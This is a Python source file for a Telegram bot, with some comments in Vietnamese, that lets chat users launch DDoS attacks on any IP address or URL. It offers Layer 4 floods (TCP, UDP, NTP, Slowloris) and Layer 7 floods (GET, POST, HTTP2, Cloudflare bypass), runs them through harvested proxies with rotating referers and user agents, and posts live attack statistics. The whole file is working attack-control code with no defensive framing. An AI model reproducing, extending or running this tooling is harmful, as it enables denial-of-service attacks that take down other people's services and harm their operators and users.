import telebot
import asyncio
from threading import Thread
import socket
from time import time, sleep
from proxy_manager import ProxyManager
from attack_methods import Layer4Attack, Layer7Attack
import json
import logging
import psutil
from utils import humanbytes, format_time, get_network_latency
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', level=logging.INFO)
logger = logging.getLogger("DDoSBot")

with open("config.json", "r") as f:
    config = json.load(f)

bot = telebot.TeleBot(config["telegram_token"], threaded=True)
attacks = {}
proxies = set()
message_ids = {}
referers = []
user_agents = []

# Vòng lặp sự kiện toàn cục
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

async def load_proxies():
    global proxies
    pm = ProxyManager(config["proxy_sources"], config["proxy_file"])
    proxies = await pm.gather_proxies()

def load_referers_and_user_agents():
    global referers, user_agents
    try:
        with open(config["referers_file"], "r") as f:
            referers = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(referers)} referers.")
    except FileNotFoundError:
        logger.error(f"Referers file {config['referers_file']} not found. Using default.")
        referers = ["https://www.google.com/"]

    try:
        with open(config["user_agents_file"], "r") as f:
            user_agents = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(user_agents)} user agents.")
    except FileNotFoundError:
        logger.error(f"User agents file {config['user_agents_file']} not found. Using default.")
        user_agents = ["Mozilla/5.0"]

SPINNER = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
spinner_idx = 0

def format_status(attack):
    global spinner_idx
    spinner = SPINNER[spinner_idx % len(SPINNER)]
    spinner_idx += 1
    elapsed_time = time() - attack.start_time if attack.start_time else 0
    remaining_time = max(0, attack.duration - elapsed_time)
    return (
        f"🔥 *Attack Status* {spinner} 🔥\n"
        f"🎯 *Target*: `{attack.target}`\n"
        f"⚙️ *Method*: `{attack.method}`\n"
        f"⏳ *Elapsed Time*: `{format_time(elapsed_time)}`\n"
        f"⏰ *Remaining Time*: `{format_time(remaining_time)}`\n"
        f"📤 *Bytes Sent*: `{humanbytes(attack.bytes_sent)}`\n"
        f"📦 *Requests Sent*: `{attack.requests_sent}`\n"
        f"🚀 *PPS*: `{attack.requests_sent // max(1, int(elapsed_time))}`/s\n"
        f"📊 *BPS*: `{humanbytes(attack.bytes_sent // max(1, int(elapsed_time)))}`/s\n"
        f"🌐 *Network*: `{get_network_latency()}`\n"
        f"🖥️ *CPU Usage*: `{psutil.cpu_percent()}%`\n"
        f"💾 *Memory Usage*: `{psutil.virtual_memory().percent}%`\n"
        f"🔗 *Proxies*: `{len(proxies)}`"
    )

def run_bot():
    try:
        bot.polling(none_stop=True, timeout=60, allowed_updates=None)
    except Exception as e:
        logger.error(f"Polling error: {e}")
        sleep(5)  # Chờ 5 giây trước khi retry
        run_bot()  # Tự động retry polling

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, (
        "🌟 *Ultra DDoS Bot* 🌟\n"
        "🔧 *Commands*:\n"
        "  `/attack   [duration]` - Start attack (Layer4: IP:port, Layer7: URL)\n"
        "  `/stop` - Stop attack\n"
        "  `/proxies` - Check proxies\n"
        "💡 *Supported Methods*: TCP, UDP, NTP, SLOWLORIS, GET, POST, HTTP2, CFB, FLOOD"
    ), parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack(message):
    global proxies, referers, user_agents
    args = message.text.split()[1:]
    if len(args) < 2:
        bot.reply_to(message, "❌ *Usage*: `/attack   [duration]`", parse_mode="Markdown")
        return

    method, target = args[0], args[1]
    duration = int(args[2]) if len(args) > 2 else config["default_duration"]

    if psutil.cpu_percent() > config["max_cpu_usage"]:
        bot.reply_to(message, "⚠️ *CPU usage too high, try again later!*", parse_mode="Markdown")
        return

    try:
        if method.upper() in ["TCP", "UDP", "NTP", "SLOWLORIS"]:
            if "http" in target.lower():
                bot.reply_to(message, "❌ *Error*: Layer4 methods (TCP, UDP, NTP, SLOWLORIS) require IP:port, not URL!", parse_mode="Markdown")
                return
            if ":" not in target:
                target += ":80"
            host, port = target.split(":")
            socket.gethostbyname(host)
            attack = Layer4Attack(target, method, proxies, config["default_threads"], duration, referers, user_agents)
        else:
            attack = Layer7Attack(target, method, proxies, config["default_threads"], duration, referers, user_agents)

        msg = bot.reply_to(message, (
            f"✅ *Attack Launched* ✅\n"
            f"🎯 *Target*: `{target}`\n"
            f"⚙️ *Method*: `{method}`\n"
            f"⏳ *Duration*: `{format_time(duration)}`\n"
            f"🧵 *Threads*: `{attack.threads}`"
        ), parse_mode="Markdown")
        message_ids[message.chat.id] = msg.message_id

        # Sử dụng executor để chạy attack trong thread chính
        def run_attack():
            loop.run_until_complete(attack.run())

        # Chạy attack trong thread riêng
        executor = Thread(target=run_attack, daemon=True)
        executor.start()
        attacks[message.chat.id] = attack

        # Chạy cập nhật trạng thái trong vòng lặp chính
        async def update_status():
            while attack.running:
                try:
                    bot.edit_message_text(format_status(attack), chat_id=message.chat.id, 
                                        message_id=message_ids[message.chat.id], parse_mode="Markdown")
                except Exception as e:
                    logger.error(f"Failed to update status: {e}")
                await asyncio.sleep(1)
            bot.edit_message_text(f"🛑 *Attack Stopped* 🛑\n📊 *Final Report*:\n{format_status(attack)}",
                                chat_id=message.chat.id, message_id=message_ids[message.chat.id], parse_mode="Markdown")

        loop.create_task(update_status())
        logger.info(f"Attack started: {method} on {target} with {attack.threads} threads")
    except Exception as e:
        bot.reply_to(message, f"❌ *Error*: `{str(e)}`", parse_mode="Markdown")
        logger.error(f"Attack initialization failed: {e}")

@bot.message_handler(commands=['stop'])
def stop(message):
    if message.chat.id in attacks:
        attacks[message.chat.id].running = False
        del attacks[message.chat.id]
        bot.reply_to(message, "🛑 *Attack stopped successfully!*", parse_mode="Markdown")
    else:
        bot.reply_to(message, "⚠️ *No active attack found!*", parse_mode="Markdown")

@bot.message_handler(commands=['proxies'])
def proxies_cmd(message):
    global proxies
    if not proxies:
        loop.run_until_complete(load_proxies())
    bot.reply_to(message, f"🔗 *Working Proxies*: `{len(proxies)}`", parse_mode="Markdown")

def main():
    loop.run_until_complete(load_proxies())
    load_referers_and_user_agents()
    bot_thread = Thread(target=run_bot, daemon=True)
    bot_thread.start()
    logger.info("Bot started.")
    try:
        loop.run_forever()
    except KeyboardInterrupt:
        loop.stop()
        logger.info("Bot stopped gracefully.")

if __name__ == "__main__":
    main()